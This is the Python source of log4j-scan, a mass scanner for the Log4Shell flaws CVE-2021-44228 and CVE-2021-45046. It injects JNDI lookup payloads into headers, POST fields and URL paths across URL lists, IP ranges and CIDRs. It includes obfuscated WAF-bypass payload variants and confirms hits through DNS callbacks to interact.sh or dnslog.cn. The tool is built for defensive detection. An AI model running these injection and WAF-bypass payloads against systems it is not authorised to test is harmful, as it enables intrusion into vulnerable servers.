#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint
from concurrent.futures import as_completed
from requests_futures.sessions import FuturesSession
import socket, struct
import tldextract
import ipaddress


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]

protocols = [f"jndi:ldap:",
            f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}',
            f'jnd${{123%25ff:-${{123%25ff:-i:}}}}ldap:',
            f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
            f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
            f'j${{::-nD}}i${{::-:}}',
            f'j${{EnV:K5:-nD}}i:ldap:']

all_paths = ['/',
    f'/solr/admin/collections?action=${{jndi:ldap:%2F%2F{{callback_host}}/{{random}}}}',
    f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D%2F%2F{{callback_host}}%2F{{random}}%7B',
    f'/%24%7Bjnd%24%7B123%2525ff%3A-%24%7B123%2525ff%3A-i%3A%7D%7Dldap%3A%2F%2F{{callback_host}}%2F{{random}}%7D'
]

typical_ports = ['443', '80', '81', '7000', '3333', '9800', '8080', '8000', '10000', '8443', '7443', '8880', '8008', '2087', '8172']

counter = 0

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}",
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                 ]  


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs / IP Range (' - ' separator) / IP CIDR / Domains / Subdomains",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--test-CVE-2021-45046",
                    dest="cve_2021_45046",
                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                    action='store_true')
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')
parser.add_argument("--wait-response",
                    dest="wait_response",
                    help="Await the Async Request Response.",
                    action='store_true')
parser.add_argument("--host-discovery",
                    dest="host_discovery",
                    help="Find hostname from the IP/IP Range",
                    action='store_true')
parser.add_argument("--export",
                    dest="export_list",
                    help="Only export the URL list.",
                    action='store_true')
parser.add_argument("--resolve",
                    dest="resolve_ip",
                    help="Scan the IP URL (http://<IP>).",
                    action='store_true')
parser.add_argument("--all-ports",
                    dest="all_ports",
                    help="Scan the URLs / Domains / Subdomains / IP Range / IP CIDR Typical Ports.",
                    action='store_true')
parser.add_argument("--workers",
                    dest="workers",
                    help="Sets the number of workers for Requests Futures.",
                    action='store',
                    default=10)
parser.add_argument("--timeout",
                    dest="timeout",
                    help="Sets the timeout for the async requests.",
                    action='store',
                    default=0.2)
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                    action='store_true')

args = parser.parse_args()

timeout = float(args.timeout)

futures = []

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
        f.close()
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    global protocols
    payloads = [f'${{{p}//{callback_host}/{random_string}}}' for p in protocols]
    return payloads

def generate_path_payloads(callback_host, random_string):
    global all_paths
    paths = [p.replace(f'{{callback_host}}', callback_host).replace(f'{{random}}', random_string) for p in all_paths]
    return paths

def get_cve_2021_45046_payloads(callback_host, random_string):
    payloads = []
    for i in cve_2021_45046:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php",
                         proxies=proxies,
                         timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php",
                         proxies=proxies,
                         timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = proxies
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})

async_session = FuturesSession(max_workers=int(args.workers), adapter_kwargs={'max_retries': 0})

def get_ips(start, end):
    '''Return IPs in IPv4 range, inclusive.'''
    start_int = int(ipaddress.ip_address(start).packed.hex(), 16)
    end_int = int(ipaddress.ip_address(end).packed.hex(), 16)
    return [ipaddress.ip_address(ip).exploded for ip in range(start_int, end_int)]

def scan_url(url, callback_host):
    global counter
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    callback_hosts = [f'{parsed_url["host"]}.{callback_host}']
    if args.waf_bypass_payloads:
        callback_hosts.append(f'127.0.0.1#{parsed_url["host"]}.{callback_host}')
    for callback_host in callback_hosts:
        payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
        payloads = [payload]
        if args.waf_bypass_payloads:
            payloads.extend(generate_waf_bypass_payloads(callback_host, random_string))
        paths = generate_path_payloads(callback_host, random_string)
        for payload in payloads:
            cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
            headers = get_fuzzing_headers(payload)
            if args.request_type.upper() == "GET" or args.run_all_tests:
                for path in paths:
                    get_url = f'{url}{path}'
                    future = async_session.get(url=get_url,
                                    headers=headers,
                                    verify=False,
                                    timeout=timeout,
                                    allow_redirects=(not args.disable_redirects))
                    future.i = counter
                    counter += 1
                    futures.append(future)

            if args.request_type.upper() == "POST" or args.run_all_tests:
                for path in paths:
                    post_url = f'{url}{path}'
                    future = async_session.post(url=post_url,
                                    headers=headers,
                                    verify=False,
                                    timeout=timeout,
                                    allow_redirects=(not args.disable_redirects))
                    future.i = counter
                    counter += 1
                    futures.append(future)


def main():
    urls = []
    if args.url:
        original_url = args.url.strip().replace('http://', '').replace('https://', '')
        i = args.url.strip().replace('http://', '').replace('https://', '')
        port = urlparse.urlparse('http://'+i).port
        ext = tldextract.extract(i)
        if ext.subdomain != '':
            i = f'{ext.subdomain}.{ext.registered_domain}'
        else:
            i = f'{ext.registered_domain}'
            if i == "":
                i = original_url
        if args.all_ports:
            for p in typical_ports:
                urls.append(f'http://{i}:{p}')
                urls.append(f'https://{i}:{p}')
        else:
            if port:
                urls.append(f'http://{i}:{port}')
                urls.append(f'http://{i}:{port}')
            else:
                urls.append(f'http://{i}')
                urls.append(f'https://{i}')
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                valid_ip = False
                ips = []
                i = i.strip().replace('http://', '').replace('https://', '')
                if i == "" or i.startswith("#"):
                    continue
                try:
                    valid_ip = ipaddress.ip_address(i)
                    ip = i
                    ips = [ip]
                except:
                    try:
                        ips = [str(ip) for ip in ipaddress.IPv4Network(i)]
                        valid_ip = True
                    except:
                        try:
                            start, end = i.split(' - ')
                            ips = get_ips(start, end)
                            valid_ip = True
                        except:
                            valid_ip = False
                if not valid_ip:
                    original_url = i
                    ext = tldextract.extract(i)
                    if ext.subdomain != '':
                        i = f'{ext.subdomain}.{ext.registered_domain}'
                        if args.resolve_ip:
                            try:
                                ip = socket.gethostbyname(f'{i}')
                                ips = [ip]
                            except:
                                ips = []
                    else:
                        i = f'{ext.registered_domain}'
                        if args.resolve_ip:
                            try:
                                ip = socket.gethostbyname(f'{i}')
                                ips = [ip]
                            except:
                                ips = []
                    path = urlparse.urlparse('http://'+original_url).path
                    port = urlparse.urlparse('http://'+original_url).port
                    if not args.all_ports:
                        if port:
                            i = f'{i}:{port}'
                        if path != "":
                            i = i + path
                if valid_ip:
                    for ip in ips:
                        if ip and f'http://{ip}' not in urls:
                            if args.all_ports:
                                urls.append(f'http://{ip}')
                                urls.append(f'https://{ip}')
                                for p in typical_ports:
                                    urls.append(f'http://{ip}:{p}')
                                    urls.append(f'https://{ip}:{p}')
                            else:
                                urls.append(f'http://{ip}')
                                urls.append(f'https://{ip}')

                        if args.host_discovery:
                            try:
                                host = socket.gethostbyaddr(ip)[0]
                                cprint(f"[•] Resolving host from IP ({ip}) -> ({host})")
                                if f'http://{host}' not in urls:
                                    urls.append(f'http://{host}')
                                    urls.append(f'https://{host}')
                                    if args.all_ports:
                                        for p in typical_ports:
                                            urls.append(f'http://{host}:{p}')
                                            urls.append(f'https://{host}:{p}')
                            except:
                                pass
                if not valid_ip and f'http://{i}' not in urls:
                    if args.all_ports:
                        for p in typical_ports:
                            urls.append(f'http://{i}:{p}')
                            urls.append(f'https://{i}:{p}')
                    else:
                        urls.append(f'http://{i}')
                        urls.append(f'https://{i}')
            f.close()

        random.shuffle(urls)

        list_name = args.usedlist.split('.')[0] + '_test_list.txt'
        cprint(f"[•] Exported URLs List to ({list_name}).")
        with open(list_name, 'w') as new_file:
            new_file.write('\n'.join(urls))
            new_file.close()

        if args.export_list:
            sys.exit()

    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host =  args.custom_dns_callback_host
    else:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh()
        elif args.dns_callback_provider == "dnslog.cn":
            dns_callback = Dnslog()
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(int(args.wait_time))
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets does not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Target Affected", "yellow")
        for i in records:
            cprint(i, "yellow")

if __name__ == "__main__":
    try:
        main()
        counter = len(futures)
        for future in as_completed(futures):
            if args.wait_response:
                try:
                    res = future.result()
                    cprint(f"[•] URL: {res.request.url} | RESPONSE: {res.url} {res.status_code}", "cyan")
                except:
                    pass
            counter -= 1
            cprint(f"[•] Pending responses: {counter}", "cyan")
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
